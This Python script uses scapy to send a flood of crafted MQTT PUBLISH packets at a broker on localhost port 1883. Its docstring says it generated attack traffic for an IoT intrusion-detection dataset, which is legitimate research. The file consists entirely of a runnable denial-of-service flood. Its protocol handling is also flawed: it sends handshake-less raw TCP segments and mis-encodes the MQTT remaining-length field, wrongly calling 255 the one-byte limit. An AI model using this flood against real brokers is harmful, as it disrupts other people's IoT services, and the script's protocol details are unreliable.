"""
MQTT Publish Flood Attack Script

This script simulates a publish flooding attack against an MQTT broker.
It was used to generate malicious IoT traffic for dataset creation
in the IoT Intrusion Detection project.

⚠ For academic and research purposes only.
"""

from scapy.all import send, Raw, RandShort
from scapy.layers.inet import IP, TCP
import time
import random

# ========================
# Attack Configuration
# ========================

TARGET_IP = "127.0.0.1"      # Local MQTT broker
TARGET_PORT = 1883           # MQTT default port
TOPICS = [
    b"Environments/humidity",
    b"Environments/temperature"
]

PACKET_COUNT = 10000         # Number of packets to send
DELAY = 0.01                 # Delay between packets (seconds)

print("🚀 Starting MQTT Publish Flood attack...")

# ========================
# Attack Logic
# ========================

for _ in range(PACKET_COUNT):
    topic = random.choice(TOPICS)
    payload = b"A" * random.randint(100, 800)

    remaining_length = len(topic) + len(payload) + 2
    remaining_length = min(remaining_length, 255)  # MQTT remaining length limit (1 byte)

    mqtt_publish_packet = (
        bytes([0x30]) +                  # MQTT PUBLISH fixed header
        bytes([remaining_length]) +
        bytes([0x00, len(topic)]) +
        topic +
        payload
    )

    packet = (
        IP(dst=TARGET_IP) /
        TCP(dport=TARGET_PORT, sport=RandShort(), flags="PA") /
        Raw(load=mqtt_publish_packet)
    )

    send(packet, verbose=False)
    time.sleep(DELAY)

print("✅ MQTT Publish Flood attack completed.")
